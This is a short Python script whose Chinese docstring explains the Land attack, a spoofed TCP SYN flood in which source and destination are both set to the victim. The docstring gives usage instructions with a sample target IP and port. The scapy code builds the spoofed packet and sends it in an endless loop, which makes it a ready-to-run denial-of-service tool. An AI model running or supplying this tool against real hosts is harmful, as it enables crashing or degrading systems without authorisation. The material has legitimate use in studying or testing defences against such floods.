'''
功能:向一台机器发动Land攻击

land 攻击简介:它是一种使用相同的源和目的主机和端口发送数据包到某台机器的攻击。结果通常使存在漏洞的机器崩溃。在Land攻击中，一个特别打造的SYN包中的原地址和目标地址都被设置成某一个服务器地址，这时将导致接受服务器向它自己的地址发送SYN一ACK消息，结果这个地址又发回ACK消息并创建一个空连接，每一个这样的连接都将保留直到超时掉。对Land攻击反应不同，许多UNIX实现将崩溃，而 Windows NT 会变的极其缓慢（大约持续五分钟）。

使用说明：
1.需要root权限
2.攻击命令
 land_attack.py victim_ip victim_server_port
 victim_ip 被攻击主机的ip
 victim_server_port 被攻击主机上的开放端口

 如攻击web服务器： python land_attack.py 10.61.1.157 80
'''
from scapy.all import IP, TCP, send
import sys,string

def LandAttack(victim_ip, victim_server_port):
	landAttackPacket = IP(src=victim_ip, dst=victim_ip)/TCP(sport=victim_server_port, dport=victim_server_port, flags="S")
	while 1:
		send(landAttackPacket)
		
if __name__=="__main__":
    if len(sys.argv)==3:
		LandAttack(sys.argv[1], string.atoi(sys.argv[2]))